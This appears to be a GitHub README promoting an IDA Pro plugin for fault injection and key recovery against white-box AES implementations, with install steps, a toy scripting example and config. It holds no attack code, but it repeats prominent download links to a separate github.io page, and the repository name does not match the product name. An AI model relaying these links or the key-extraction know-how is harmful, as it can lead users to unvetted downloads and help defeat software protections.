# WhiteBoxAesCrack - Cryptanalysis 2026

> An IDA Pro plugin built for fault injection and key-recovery analysis in Whitebox AES targets, with support for both direct execution and table generation workflows for security researchers and cryptanalysts.

[![Platform](https://img.shields.io/badge/Platform-IDA%20Pro-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cooperlogandd8935/whitebox-aes-script-loader?style=flat-square)](https://github.com/cooperlogandd8935/whitebox-aes-script-loader)

---

<p align="center">
  <a href="https://cooperlogandd8935.github.io/whitebox-aes-script-loader/">
    <img src="https://img.shields.io/badge/Download-WhiteBoxAesCrack%20Latest-brightgreen?style=for-the-badge" alt="Download WhiteBoxAesCrack">
  </a>
</p>

> **[Direct Download - WhiteBoxAesCrack v1.0](https://cooperlogandd8935.github.io/whitebox-aes-script-loader/)**

---

[Download Latest Build](https://cooperlogandd8935.github.io/whitebox-aes-script-loader/)

---

## Overview

WhiteBoxAesCrack is a purpose-built cryptanalysis utility delivered as an IDA Pro plugin. It lets analysts inject faults into Whitebox AES implementations and work toward secret-key recovery in a repeatable way. The plugin connects static reverse engineering with fault-driven analysis, creating a practical path for evaluating white-box cryptographic defenses.

The project exists to give reverse engineers a more hands-on cryptanalysis workflow inside IDA Pro. Because it runs in the same environment used for disassembly and inspection, researchers can carry out fault injection experiments without leaving their usual analysis setup. Whether you are reviewing a custom white-box implementation or studying attack techniques, WhiteBoxAesCrack supplies the core functions needed for fault injection and recovery analysis.

---

## Capabilities

- **Fault Injection Engine** - Applies controlled faults to live white-box AES implementations so you can study resulting behavior
- **Key Recovery Analysis** - Processes fault output automatically to help reconstruct the original encryption key
- **Direct Mode Support** - Operates on binary-level white-box implementations without requiring preprocessing
- **Table Generation Mode** - Produces and examines the lookup tables used by white-box AES designs
- **IDA Pro Integration** - Runs as a plugin inside the IDA Pro reverse engineering workflow
- **Modular Architecture** - Structured so custom fault models and analysis methods can be added with ease

---

## Installation

1. Clone the repository to your local machine:
   ```bash
   git clone https://github.com/cooperlogandd8935/whitebox-aes-script-loader.git
   ```
2. Copy the plugin files into your IDA Pro plugins directory (`<IDA_install_dir>/plugins/`)
3. Restart IDA Pro - the plugin will appear under the Edit menu or as a toolbar icon

For first-time setup, ensure you have the required dependencies (see Requirements section below).

---

## Usage

**Basic Workflow:**

1. Load your target binary containing a white-box AES implementation into IDA Pro
2. Launch WhiteBoxAesCrack from the Plugins menu
3. Select the target function or region for fault injection
4. Choose between **Direct Mode** (immediate fault injection) or **Table Generation Mode** (table extraction and analysis)
5. Execute the fault injection routine and observe output
6. Review key recovery results in the analysis panel

**Example Command (Scripting):**
```python
# Python script example for automated fault injection
plugin = WhiteBoxAesCrack()
plugin.set_mode("direct")
plugin.inject_faults(address=0x401000, count=100)
plugin.analyze_recovery()
```

---

## Configuration

Configuration is saved in a JSON file at `~/.whiteboxaescrack/config.json`. You can adjust:
- Default fault injection parameters
- Output directory for analysis results
- Logging verbosity levels

Example configuration block:
```json
{
  "fault_count": 50,
  "fault_type": "bit_flip",
  "output_dir": "./results",
  "log_level": "info"
}
```

---

## Requirements

- **Platform:** IDA Pro 7.5 or later (Windows/Linux/macOS)
- **Runtime:** Python 3.8+ (bundled with IDA Pro)
- **Storage:** ~50 MB for plugin files and temporary analysis data
- **Dependencies:** `numpy`, `pycryptodome` (install via pip if missing)

---

## FAQ

**Q: Is the plugin compatible with every white-box AES implementation?**
A: It targets common white-box constructions, but custom or heavily obfuscated variants may need extra configuration.

**Q: What is the upgrade process?**
A: Fetch the newest repository changes and replace the plugin files in your IDA Pro plugins directory.

**Q: May I change the fault injection settings?**
A: Yes. You can do that through the JSON configuration file or the plugin GUI settings panel.

**Q: How do I submit a problem report?**
A: Open a GitHub issue and include a clear description of the issue along with your environment details.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
